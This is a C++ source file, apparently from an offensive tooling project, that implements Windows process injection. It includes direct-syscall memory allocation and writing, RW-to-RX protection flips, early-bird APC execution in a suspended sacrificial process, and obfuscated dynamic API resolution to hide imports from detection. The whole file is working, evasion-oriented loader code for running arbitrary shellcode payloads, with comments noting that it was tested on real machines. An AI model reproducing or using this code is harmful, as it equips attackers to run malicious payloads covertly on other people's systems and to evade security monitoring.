#include "Core/Inject/PlatformWin_InjectCore.hpp"

#include "Core/Native/Win/Syscall.hpp"
#include "Common/Logger/ErrLog.hpp"
#include "Common/Logger/Logger.hpp"

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

// 导入表脱敏: ApiResolver(内含 windows.h)置于 LEAN 定义之后 —— 与 Injector.cpp 同序
#include "Core/Native/Win/ApiResolver.hpp"

namespace cleat {
namespace injection {

    using namespace cleat::native;   // NTSTATUS/STATUS_SUCCESS/访问权常量可见性(PidApc 同款)

    // RX 翻转: NtProtectVirtualMemory 的 thunk 在远端句柄上实测 0xC0000005
    // , 走 ApiResolver 的 VirtualProtectEx(迁移 E2E 已验证)。
    static const auto pVirtualProtectEx =
        cleat::ApiResolver::Proc<BOOL(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD)>(
            OBF_STR("kernel32.dll"), OBF_STR("VirtualProtectEx"));

    InjectionResult AttachToPid(unsigned long pid, void** hProcess) {
        InjectionResult result;
        *hProcess = nullptr;
        const auto& api = native::Api();
        if (!api.ready || !api.NtOpenProcess) {
            result.error = "syscall layer not ready";
            return result;
        }
        native::OBJECT_ATTRIBUTES_NT oa{};
        oa.Length = sizeof(native::OBJECT_ATTRIBUTES_NT);
        native::CLIENT_ID_NT cid{};
        cid.UniqueProcess = reinterpret_cast<void*>(
            static_cast<std::uintptr_t>(pid));
        const NTSTATUS st = api.NtOpenProcess(hProcess,
            PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION
            | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
            &oa, &cid);
        if (st != STATUS_SUCCESS) {
            result.error = "NtOpenProcess failed";
            result.failed_at = static_cast<unsigned long>(st);
            return result;
        }
        result.ok = true;
        return result;
    }

    InjectionResult WriteExecutableMemory(void* hProcess,
        const std::vector<uint8_t>& payload, void** out_base) {
        InjectionResult result;
        *out_base = nullptr;
        const auto& api = native::Api();
        if (!api.ready) {
            result.error = "syscall layer not ready";
            return result;
        }
        if (payload.empty()) {
            result.error = "empty payload";
            return result;
        }
        if (!pVirtualProtectEx) {
            result.error = "VirtualProtectEx resolve failed";
            return result;
        }

        void* base = nullptr;
        std::size_t region = payload.size();
        NTSTATUS st = api.NtAllocateVirtualMemory(hProcess, &base, 0, &region,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (st != STATUS_SUCCESS) {
            result.error = "NtAllocateVirtualMemory(payload) failed";
            result.failed_at = static_cast<unsigned long>(st);
            return result;
        }

        st = api.NtWriteVirtualMemory(hProcess, base,
            const_cast<uint8_t*>(payload.data()), payload.size(), nullptr);
        if (st != STATUS_SUCCESS) {
            result.error = "NtWriteVirtualMemory(payload) failed";
            result.failed_at = static_cast<unsigned long>(st);
            return result;
        }

        DWORD oldProtect = 0;
        if (!pVirtualProtectEx(hProcess, base, region,
            PAGE_EXECUTE_READ, &oldProtect)) {
            result.error = "内存保护翻转(RX)失败";
            result.failed_at = static_cast<unsigned long>(::GetLastError());
            return result;
        }

        *out_base = base;
        result.ok = true;
        return result;
    }

    InjectionResult TriggerApcNewThread(void* hProcess, void* base) {
        InjectionResult result;
        const auto& api = native::Api();
        void* hThread = nullptr;
        // 挂起远线程(start = 载荷入口, APC 交付异常时执行语义兜底) →
        // early-bird APC → Resume(迁移链同构, 已真机验证)
        // 入口意味着**返回型载荷必然双执行**(APC 先跑, 返回后 RtlUserThreadStart
        // 再调 start 例程; 对反射加载产物 = 同一映像二次映射, 目标进程必炸)。
        // 因此仅接受一次性 shellcode 载荷经此路径; 反射加载载荷的入口必须是
        // 不返回的(自行 ExitThread), 这是 v1 设计口径, 改语义需另立设计。
        NTSTATUS st = api.NtCreateThreadEx(&hThread,
            THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME
            | THREAD_GET_CONTEXT,
            nullptr, hProcess, base, nullptr,
            THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
            0, 0, 0, nullptr);
        if (st != STATUS_SUCCESS) {
            result.error = "NtCreateThreadEx failed";
            result.failed_at = static_cast<unsigned long>(st);
            return result;
        }
        st = api.NtQueueApcThread(hThread, base, nullptr, nullptr, nullptr);
        if (st != STATUS_SUCCESS) {
            api.NtClose(hThread);
            result.error = "NtQueueApcThread failed";
            result.failed_at = static_cast<unsigned long>(st);
            return result;
        }
        st = api.NtResumeThread(hThread, nullptr);
        if (st < 0) {
            api.NtClose(hThread);
            result.error = "NtResumeThread failed";
            result.failed_at = static_cast<unsigned long>(st);
            return result;
        }
        api.NtClose(hThread);
        result.ok = true;
        return result;
    }

    // ---- spawn 牺牲进程注入(自 Core/Native/Win/Injector 整合, ) ----
    static const auto pCreateProcessW =
        cleat::ApiResolver::Proc<BOOL(WINAPI*)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES,
            LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR,
            LPSTARTUPINFOW, LPPROCESS_INFORMATION)>(
            OBF_STR("kernel32.dll"), OBF_STR("CreateProcessW"));
    static const auto pTerminateProcess =
        cleat::ApiResolver::Proc<BOOL(WINAPI*)(HANDLE, UINT)>(
            OBF_STR("kernel32.dll"), OBF_STR("TerminateProcess"));
    static const auto pCloseHandle =
        cleat::ApiResolver::Proc<BOOL(WINAPI*)(HANDLE)>(
            OBF_STR("kernel32.dll"), OBF_STR("CloseHandle"));

    InjectionResult SpawnAndInject(const std::wstring& target_image,
        const std::vector<uint8_t>& blob, bool keep_on_fail) {
        InjectionResult result;
        if (!native::Init()) {
            result.error = "syscall layer init failed";
            return result;
        }
        const auto& api = native::Api();
        if (!api.ready) {
            result.error = "syscall layer not ready after init";
            return result;
        }
        if (blob.empty()) {
            result.error = "empty payload";
            return result;
        }
        if (!pCreateProcessW || !pTerminateProcess || !pCloseHandle || !pVirtualProtectEx) {
            result.error = "api resolve failed";
            return result;
        }

        // : 进程创建走 CreateProcessW(CREATE_SUSPENDED)。原
        // NtCreateUserProcess + RtlCreateProcessParametersEx 链路在本机 ntdll
        // 19041.7725 上因 rtlPp 缺陷非确定性崩溃, 注入语义不变(见头注释)。
        STARTUPINFOW si{};
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi{};
        if (!pCreateProcessW(target_image.c_str(), nullptr, nullptr, nullptr,
            FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
            result.error = "CreateProcessW failed";
            result.failed_at = static_cast<unsigned long>(::GetLastError());
            CLEAT_LOGE(ErrDom::Mod, ErrCode::PlatformApiFailed, "Injector: " << result.error << " (0x" << std::hex
                << result.failed_at << ")");
            return result;
        }
        result.pid = pi.dwProcessId;

        // ---- blob: RW 写入 → RX 翻转 → early-bird APC → Resume(迁移链同语义) ----
        do {
            void* base = nullptr;
            std::size_t region = blob.size();
            NTSTATUS st = api.NtAllocateVirtualMemory(pi.hProcess, &base, 0, &region,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (st != STATUS_SUCCESS) {
                result.error = "NtAllocateVirtualMemory(payload) failed";
                result.failed_at = static_cast<unsigned long>(st);
                break;
            }

            st = api.NtWriteVirtualMemory(pi.hProcess, base,
                const_cast<uint8_t*>(blob.data()), blob.size(), nullptr);
            if (st != STATUS_SUCCESS) {
                result.error = "NtWriteVirtualMemory(payload) failed";
                result.failed_at = static_cast<unsigned long>(st);
                break;
            }

            {
                DWORD oldProtect = 0;
                if (!pVirtualProtectEx(pi.hProcess, base, region,
                    PAGE_EXECUTE_READ, &oldProtect)) {
                    result.error = "内存保护翻转(RX)失败";
                    result.failed_at = static_cast<unsigned long>(::GetLastError());
                    break;
                }
            }

            // early-bird APC: 挂起的主线程恢复时执行载荷入口(第 0 字节)
            st = api.NtQueueApcThread(pi.hThread, base, nullptr, nullptr, nullptr);
            if (st != STATUS_SUCCESS) {
                result.error = "NtQueueApcThread failed";
                result.failed_at = static_cast<unsigned long>(st);
                break;
            }

            st = api.NtResumeThread(pi.hThread, nullptr);
            if (st < 0) {
                result.error = "NtResumeThread failed";
                result.failed_at = static_cast<unsigned long>(st);
                break;
            }

            result.ok = true;
        } while (false);

        // 收尾(OwnsTarget): 牺牲进程归本函数所有 —— 失败且未 keep_on_fail → 清尸
        if (!result.ok && !keep_on_fail) {
            pTerminateProcess(pi.hProcess, 1);
        }
        if (result.ok) {
            LOG_INFO("Injector: 注入完成 target_pid=" << result.pid
                << " payload=" << blob.size() << "B");
        }
        else {
            CLEAT_LOGE(ErrDom::Mod, ErrCode::PlatformApiFailed, "Injector: " << result.error << " (0x" << std::hex
                << result.failed_at << ")");
        }
        pCloseHandle(pi.hThread);
        pCloseHandle(pi.hProcess);
        return result;
    }

} // namespace injection
} // namespace cleat
